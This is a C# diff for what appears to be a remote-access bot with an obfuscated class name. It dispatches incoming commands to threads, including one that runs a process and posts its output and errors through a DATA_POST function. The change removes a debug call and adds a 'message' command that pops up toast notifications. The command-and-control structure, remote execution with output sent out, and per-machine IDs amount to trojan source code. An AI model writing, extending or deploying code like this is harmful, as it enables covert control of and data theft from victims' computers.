@@ -26,8 +26,7 @@ public class Program
     public static void Main(string[] args)
     {
         //debug
-        string A = "a";
-        ToastExtensions.Show(A);
+
         //end
         AsyncMain();
         Tools.Wait();
@@ -171,9 +170,10 @@ public class S1l14lx3
                     ModuleThread = new Thread(S1l14lx3_Module.DFL);
                     ModuleThread.Start(Command);
                     break;
-                //Comment
+                //Toast Message
                 case "message":
-                    //Code
+                    ModuleThread = new Thread(S1l14lx3_Module.TOAST);
+                    ModuleThread.Start(Command);
                     break;
                 //Exit
                 case "exit":
@@ -257,6 +257,11 @@ public class S1l14lx3
                     ModuleThread = new Thread(S1l14lx3_Module.BNMs);
                     ModuleThread.Start(Command);
                     break;
+                //Toast Message
+                case "message":
+                    ModuleThread = new Thread(S1l14lx3_Module.TOAST);
+                    ModuleThread.Start(Command);
+                    break;
                 //Exit
                 case "exit":
                     await S1l14lx3_Module.DATA_POST($"プログラムを終了しました\nID : ```{Import.ID}```");
@@ -338,6 +343,11 @@ public class S1l14lx3_Module
         var SOutput = process.StandardOutput.ReadToEnd();
         var SError = process.StandardError.ReadToEnd();
         await DATA_POST($"```Exit Code : {process.ExitCode}\nStandardOutput :\n{SOutput}\nStandardError :\n{SError}```");
+    }
+    public static void TOAST(object Obj)
+    {
+        string[] CMD = (string[])Obj;
+        Tools.ShowToast(CMD[1]);
     }
     public static async void BNMs(object Obj)
     {
